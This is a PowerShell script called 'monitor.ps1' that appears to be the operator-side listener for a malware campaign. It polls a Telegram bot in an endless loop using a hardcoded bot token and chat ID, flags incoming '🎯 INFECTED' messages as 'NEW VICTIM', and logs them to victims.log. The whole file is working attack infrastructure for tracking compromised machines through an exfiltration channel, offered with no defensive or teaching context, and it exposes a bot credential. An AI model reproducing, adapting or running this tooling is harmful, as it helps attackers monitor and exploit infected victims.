# monitor.ps1 - Auto-check for new exfil
$Token = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
$ChatID = "7873230435"
$LastUpdate = 0

while ($true) {
    try {
        $Updates = Invoke-RestMethod "https://api.telegram.org/bot$Token/getUpdates?offset=$LastUpdate&timeout=30"
        foreach ($Update in $Updates.result) {
            $Text = $Update.message.text
            $From = $Update.message.from.first_name
            $Date = [datetime]::Parse($Update.message.date)

            if ($Text -match "🎯 INFECTED") {
                Write-Host "[+] NEW VICTIM: $Text" -ForegroundColor Red
                # Optional: Log to file
                "$($Date): $Text" | Out-File "victims.log" -Append
            }
            $LastUpdate = $Update.update_id + 1
        }
    }
    catch { Start-Sleep 10 }
    Start-Sleep 5
}